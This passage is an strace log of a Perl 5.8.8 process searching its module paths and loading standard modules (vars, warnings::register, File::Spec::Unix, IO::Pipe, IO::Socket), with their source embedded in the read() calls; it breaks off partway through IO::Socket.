11347 07:37:14.589998 stat64("/etc/perl/vars.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590011 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590024 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590049 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590090 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590106 stat64("/usr/lib/perl5/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590135 stat64("/usr/lib/perl5/vars.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590148 stat64("/usr/share/perl5/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590160 stat64("/usr/share/perl5/vars.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590173 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590185 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfb6166c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590199 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfb6175c) = -1 ENOENT (No such file or directory)
11347 07:37:14.590211 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
11347 07:37:14.590232 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
11347 07:37:14.590246 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61478) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.590257 _llseek(10, 0, [0], SEEK_CUR) = 0
11347 07:37:14.590274 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
11347 07:37:14.590392 stat64("/etc/perl/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590407 stat64("/etc/perl/warnings/register.pm", 0xbfb611bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.590421 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590434 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfb611bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.590449 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590462 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfb611bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.590477 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590489 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfb611bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.590503 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590515 stat64("/usr/share/perl5/warnings/register.pm", 0xbfb611bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.590529 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590573 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfb611bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.590602 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfb612ac) = -1 ENOENT (No such file or directory)
11347 07:37:14.590615 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
11347 07:37:14.590637 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
11347 07:37:14.590651 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb60fc8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.590663 _llseek(11, 0, [0], SEEK_CUR) = 0
11347 07:37:14.590681 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
11347 07:37:14.590842 read(11, "", 4096) = 0
11347 07:37:14.590855 close(11)         = 0
11347 07:37:14.591030 _llseek(10, 1148, [1148], SEEK_SET) = 0
11347 07:37:14.591030 _llseek(10, 0, [1148], SEEK_CUR) = 0
11347 07:37:14.591030 close(10)         = 0
11347 07:37:14.591030 _llseek(8, 594, [594], SEEK_SET) = 0
11347 07:37:14.591031 _llseek(8, 0, [594], SEEK_CUR) = 0
11347 07:37:14.591031 close(8)          = 0
11347 07:37:14.591035 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591051 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591064 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591077 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591091 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591104 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591118 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591130 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591143 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591155 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591169 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591181 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591195 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.591208 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
11347 07:37:14.591229 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.591272 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.591320 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.591353 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
11347 07:37:14.592021 brk(0x8218000)    = 0x8218000
11347 07:37:14.600588 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
11347 07:37:14.600904 read(8, "", 4096) = 0
11347 07:37:14.600904 close(8)          = 0
11347 07:37:14.601101 read(6, "", 4096) = 0
11347 07:37:14.601117 close(6)          = 0
11347 07:37:14.601297 stat64("/etc/perl/IO/Pipe.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601315 stat64("/etc/perl/IO/Pipe.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601330 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601343 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601357 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601369 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601383 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601395 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601408 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601420 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601433 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.601446 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
11347 07:37:14.601467 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.601482 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.601494 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.601515 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
11347 07:37:14.602230 _llseek(6, 3425, [3425], SEEK_SET) = 0
11347 07:37:14.602257 _llseek(6, 0, [3425], SEEK_CUR) = 0
11347 07:37:14.602296 close(6)          = 0
11347 07:37:14.602335 stat64("/etc/perl/IO/Socket.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602349 stat64("/etc/perl/IO/Socket.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602363 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602376 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602390 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602403 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602417 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602429 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602442 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602454 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602472 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.602484 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
11347 07:37:14.602506 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.602521 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.602532 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.602550 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire 